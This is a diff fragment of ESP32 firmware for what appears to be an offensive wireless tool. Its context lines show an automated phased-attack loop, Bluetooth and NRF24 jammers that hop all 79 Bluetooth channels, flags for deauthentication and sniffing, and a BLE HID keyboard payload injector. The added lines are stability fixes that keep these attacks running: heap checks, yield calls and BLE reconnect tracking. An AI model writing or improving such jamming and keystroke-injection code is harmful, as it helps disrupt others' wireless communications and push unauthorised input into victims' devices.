+    if (freeHeap < 20000) {
+      Serial.printf("[WARN] Low heap: %u bytes — WiFi may become unstable!\n", freeHeap);
+      // If heap is critically low and nothing active, try to free memory
+      if (freeHeap < 10000 && !payloadExecuting && !sniffing && !deauthing && !btJamming) {
+        Serial.println("[WARN] Critical heap — clearing buffers");
+        payloadBuffer = "";
+      }
+    }
+  }
 
   /* ---- AUTOMATED PHASED ATTACK ---- */
   switch (currentPhase) {
@@ -3301,6 +3268,7 @@ void loop() {
       sendBtJamBurst();
       lastBtJam = now;
     }
+    yield(); // Let WiFi task breathe
   }
 
   /* ---- NRF24 CLASSIC BT JAMMER ---- */
@@ -3313,10 +3281,35 @@ void loop() {
     } else {
       // Jam as fast as possible — no delay, hop all 79 BT channels continuously
       sendNrfJamBurst();
+      yield(); // Prevent WiFi task starvation
     }
   }
 
   /* ---- PAYLOAD INJECTOR (BLE HID KEYBOARD) ---- */
+  // Track BLE connection state changes for stability
+  if (bleKbStarted) {
+    bool currentlyConnected = bleKeyboard.isConnected();
+    if (currentlyConnected && !bleWasConnected) {
+      // Just connected
+      bleWasConnected = true;
+      bleLastConnChange = now;
+      bleDisconnectTime = 0;
+      Serial.printf("[BLE] Device connected (heap: %u)\n", ESP.getFreeHeap());
+      addEvent("BLE: Device connected");
+    } else if (!currentlyConnected && bleWasConnected) {
+      // Just disconnected
+      bleWasConnected = false;
+      bleLastConnChange = now;
+      Serial.println("[BLE] Device disconnected — will re-advertise");
+      addEvent("BLE: Device disconnected");
+      // Give NimBLE a moment then ensure advertising restarts
+      delay(200);
+      // NimBLE auto-restarts advertising on disconnect, but WiFi interference
+      // can cause it to fail. The BleKeyboard library handles this internally.
+      // We just need to avoid interfering during the re-advertising window.
+    }
+  }
+
   if (payloadExecuting && bleKbStarted && bleKeyboard.isConnected()) {
     bleDisconnectTime = 0; // reset grace timer while connected
     if (now >= payloadNextExecTime) {
